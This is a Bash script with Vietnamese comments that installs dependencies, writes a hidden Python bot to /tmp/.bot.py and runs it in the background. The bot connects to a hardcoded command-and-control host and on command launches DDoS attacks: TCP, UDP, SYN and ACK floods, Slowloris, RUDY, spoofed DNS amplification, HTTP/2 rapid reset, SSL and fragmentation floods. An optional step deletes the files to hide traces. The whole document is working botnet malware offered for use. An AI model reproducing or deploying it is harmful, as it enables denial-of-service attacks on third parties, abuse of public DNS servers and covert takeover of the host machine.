#!/bin/bash

# Đường dẫn file bot ẩn
BOT_PATH="/tmp/.bot.py"

# Hàm kiểm tra và cài đặt Python
install_python() {
    if command -v python3 >/dev/null 2>&1; then
        echo "[+] Python3 đã được cài đặt."
    else
        echo "[!] Python3 chưa được cài đặt. Đang cài đặt..."
        if command -v apt-get >/dev/null 2>&1; then
            # Hệ thống dựa trên Debian/Ubuntu
            sudo apt-get update -y
            sudo apt-get install -y python3
        elif command -v yum >/dev/null 2>&1; then
            # Hệ thống dựa trên Red Hat/CentOS
            sudo yum install -y python3
        else
            echo "[!] Không hỗ trợ trình quản lý gói này. Vui lòng cài Python3 thủ công."
            exit 1
        fi
    fi
}

# Hàm kiểm tra và cài đặt pip
install_pip() {
    if command -v pip3 >/dev/null 2>&1; then
        echo "[+] pip3 đã được cài đặt."
    else
        echo "[!] pip3 chưa được cài đặt. Đang cài đặt..."
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get install -y python3-pip
        elif command -v yum >/dev/null 2>&1; then
            sudo yum install -y python3-pip
        else
            echo "[!] Không hỗ trợ trình quản lý gói này. Vui lòng cài pip3 thủ công."
            exit 1
        fi
    fi
}

# Hàm cài đặt thư viện Python
install_python_libs() {
    echo "[+] Đang cài đặt các thư viện Python cần thiết..."
    pip3 install requests scapy >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "[+] Đã cài đặt requests và scapy."
    else
        echo "[!] Lỗi khi cài đặt thư viện Python."
        exit 1
    fi
}

# Hàm kiểm tra và cài đặt hping3
install_hping3() {
    if command -v hping3 >/dev/null 2>&1; then
        echo "[+] hping3 đã được cài đặt."
    else
        echo "[!] hping3 chưa được cài đặt. Đang cài đặt..."
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get install -y hping3
        elif command -v yum >/dev/null 2>&1; then
            sudo yum install -y hping3
        else
            echo "[!] Không hỗ trợ trình quản lý gói này. Vui lòng cài hping3 thủ công."
            exit 1
        fi
    fi
}

# Kiểm tra và cài đặt các phụ thuộc
echo "[*] Kiểm tra và cài đặt các phụ thuộc..."
install_python
install_pip
install_python_libs
install_hping3

# Ghi nội dung Python vào file
echo "[*] Tạo file bot tại $BOT_PATH..."
cat << 'EOF' > "$BOT_PATH"
import socket
import threading
import time
import random
import string
import requests
import http.client
import ssl
import struct
from scapy.all import *  # Requires scapy for packet crafting
import os

C2_HOST = "meet-true.gl.at.ply.gg"
C2_PORT = 46276

def random_string(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101",
]

# Existing Attacks
def http_flood(target, port, duration):
    end_time = time.time() + duration
    url = f"http://{target}:{port}/?{random_string(6)}"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }
    while time.time() < end_time:
        try:
            requests.get(url, headers=headers, timeout=2)
        except:
            pass

def tcp_flood(target, port, duration):
    end_time = time.time() + duration
    payload = random_string(1024).encode()
    while time.time() < end_time:
        try:
            s = socket.socket()
            s.connect((target, port))
            s.send(payload)
            s.close()
        except:
            pass

def udp_flood(target, port, duration):
    end_time = time.time() + duration
    payload = random_string(1024).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        s.sendto(payload, (target, port))

def tcp_syn_flood(target, port, duration):
    os.system(f"hping3 -S {target} -p {port} --flood")

def ack_flood(target, port, duration):
    os.system(f"hping3 -A {target} -p {port} --flood")

# New Attack Vectors
def slowloris(target, port, duration):
    """Slowloris: Keeps connections open with partial HTTP requests."""
    end_time = time.time() + duration
    sockets = []
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random_string(10)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            s.send(b"Accept: */*\r\n")
            sockets.append(s)
            time.sleep(random.uniform(0.1, 0.5))  # Random delay to evade detection
        except:
            pass
        # Send keep-alive headers periodically
        for sock in sockets[:]:
            try:
                sock.send(f"X-a: {random_string(10)}\r\n".encode())
            except:
                sockets.remove(sock)
    for s in sockets:
        s.close()

def rudy(target, port, duration):
    """R.U.D.Y.: Submits long POST requests to exhaust server."""
    end_time = time.time() + duration
    url = f"http://{target}:{port}/"
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
    }
    while time.time() < end_time:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=5)
            conn.request("POST", f"/?{random_string(10)}", headers=headers)
            time.sleep(random.uniform(0.5, 2))  # Slow trickle of data
            conn.send(f"data={random_string(10000)}".encode())
            conn.close()
        except:
            pass

def dns_amplification(target, duration):
    """DNS Amplification: Spoofs DNS queries to amplify traffic."""
    end_time = time.time() + duration
    dns_servers = ["8.8.8.8", "9.9.9.9"]  # Public DNS servers
    while time.time() < end_time:
        for dns in dns_servers:
            try:
                pkt = IP(src=random_ip(), dst=dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=f"{random_string(10)}.{target}", qtype="ANY"))
                send(pkt, verbose=0)
            except:
                pass

def http2_rapid_reset(target, port, duration):
    """HTTP/2 Rapid Reset: Exploits HTTP/2 stream resets."""
    end_time = time.time() + duration
    try:
        context = ssl.create_default_context()
        conn = http.client.HTTPSConnection(target, port, context=context)
        while time.time() < end_time:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                ":method": "GET",
                ":path": f"/?{random_string(10)}",
                ":scheme": "https",
            }
            conn.request("GET", f"/?{random_string(10)}", headers=headers)
            conn.close()  # Rapidly reset streams
            conn = http.client.HTTPSConnection(target, port, context=context)
    except:
        pass

def ssl_flood(target, port, duration):
    """SSL/TLS Flood: Exhausts server with SSL handshakes."""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2)
            s.connect((target, port))
            s.close()
        except:
            pass

def mixed_protocol(target, port, duration):
    """Mixed Protocol: Combines HTTP, TCP, and UDP attacks."""
    threads = [
        threading.Thread(target=http_flood, args=(target, port, duration)),
        threading.Thread(target=tcp_flood, args=(target, port, duration)),
        threading.Thread(target=udp_flood, args=(target, port, duration)),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def ip_fragmentation(target, port, duration):
    """IP Fragmentation: Sends fragmented packets to bypass firewalls."""
    end_time = time.time() + duration
    payload = random_string(1500).encode()
    while time.time() < end_time:
        try:
            pkt = IP(dst=target, flags="MF") / TCP(dport=port) / payload[:500]
            send(pkt, verbose=0)
            pkt = IP(dst=target, frag=1) / payload[500:1000]
            send(pkt, verbose=0)
            pkt = IP(dst=target, frag=2) / payload[1000:]
            send(pkt, verbose=0)
        except:
            pass

def random_subdomain(target, port, duration):
    """Random Subdomain Attack: Targets random subdomains to evade DNS defenses."""
    end_time = time.time() + duration
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    while time.time() < end_time:
        subdomain = f"{random_string(10)}.{target}"
        url = f"http://{subdomain}:{port}/?{random_string(6)}"
        try:
            requests.get(url, headers=headers, timeout=2)
        except:
            pass

# Command Handler
def handle_command(cmd):
    parts = cmd.strip().split()
    if len(parts) < 4:
        return
    method, target, port, duration = parts[0], parts[1], int(parts[2]), int(parts[3])
    print(f"[!] Nhận lệnh: {method} đến {target}:{port} trong {duration}s")

    attacks = {
        "HTTP": http_flood,
        "TCP": tcp_flood,
        "UDP": udp_flood,
        "SYN": tcp_syn_flood,
        "ACK": ack_flood,
        "SLOWLORIS": slowloris,
        "RUDY": rudy,
        "DNSAMP": dns_amplification,
        "HTTP2": http2_rapid_reset,
        "SSL": ssl_flood,
        "MIXED": mixed_protocol,
        "FRAG": ip_fragmentation,
        "SUBDOMAIN": random_subdomain,
    }

    if method in attacks:
        threading.Thread(target=attacks[method], args=(target, port, duration)).start()
    else:
        print(f"[x] Phương thức {method} không hỗ trợ")

# C2 Connection
def connect_to_c2():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            s.send(b"[+] Bot đã kết nối\n")
            while True:
                data = s.recv(1024).decode()
                if data.strip().upper() == "STOP":
                    print("[x] Đã dừng tấn công")
                    break
                handle_command(data)
        except Exception as e:
            print(f"[x] Mất kết nối C2: {e}, đang reconnect...")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_c2()
EOF

# Cấp quyền thực thi cho file bot
chmod +x "$BOT_PATH"

# Chạy file bot ngầm (ẩn terminal)
echo "[*] Chạy bot ngầm..."
nohup python3 "$BOT_PATH" >/dev/null 2>&1 &

# Tùy chọn: tự xóa sau khi chạy để ẩn dấu vết
# Uncomment dòng bên dưới nếu muốn
# echo "[*] Xóa file bot sau 2 giây..."
# sleep 2 && rm -f "$BOT_PATH" && rm -f "$0"
